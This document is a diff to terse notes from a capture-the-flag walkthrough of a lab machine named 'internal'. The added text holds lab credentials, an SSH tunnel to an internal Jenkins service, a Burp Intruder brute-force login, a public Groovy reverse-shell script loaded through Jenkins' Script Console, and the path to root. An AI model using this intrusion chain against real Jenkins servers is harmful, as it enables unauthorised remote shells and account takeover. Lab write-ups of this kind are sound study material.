@@ -4,9 +4,9 @@
 
 admin:my2boys Wordpress
 william:arnold147
-
+admin:spongebob
 aubreanna:bubb13guM!@#123
-
+root:tr0ub13guM!@#123
 
 
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
@@ -121,5 +121,51 @@ Bill,
 Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
 
 aubreanna:bubb13guM!@#123
+
+// Shell as Aubreanna
+
+	aubreanna@internal:~$ cat user.txt 
+	
+	aubreanna@internal:~$ cat jenkins.txt 
+	Internal Jenkins service is running on 172.17.0.2:8080
+	
+	Tunnel the SSH connection 
+// SSH tunnel
+	ssh -L 8080:172.17.0.2:8080  aubreanna@10.10.92.209
+	
+		Browser 127.0.0.1:8080
+			
+			Jenkins service
+// Jenkins
+	Bruteforce login with Burp intruder
+	Research Jenkins
+		Login admin:spongebob
+		
+	Manage Jenking > Script Console>
+	
+	https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
+	
+	change line in script 
+		String cmd="bash";
+		
+// Shell as Jenkins
+	jenkins@jenkins:/opt$ cat note.txt 
+	Aubreanna,
+
+	Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
+	need access to the root user account.
+
+	root:tr0ub13guM!@#123
+	
+//SSH as root
+	root@internal:~# cat root.txt 
+
+
+
+	
+
+	
+	
+
 
  
